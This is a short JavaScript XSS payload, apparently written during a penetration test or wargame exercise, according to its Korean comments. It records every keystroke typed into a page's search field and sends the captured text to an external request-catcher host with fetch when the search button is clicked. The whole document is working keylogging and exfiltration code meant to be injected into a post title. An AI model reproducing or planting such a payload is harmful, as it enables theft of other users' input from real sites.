// 글 제목 부분에 입력하면 검색어를 탈취할 수 있다.
// 모의해킹 점검 중 9
const search_word = document.getElementsByName("search_word")[0];

var search_keylog = "";

search_word.addEventListener("keyup", () => {
    search_keylog += event.key;
});

const search_btn = document.getElementsByTagName("button")[0];

search_btn.addEventListener('click', () => {
    fetch("https://tksqwzr.request.dreamhack.games?k=" + search_keylog);
    key = "";
})
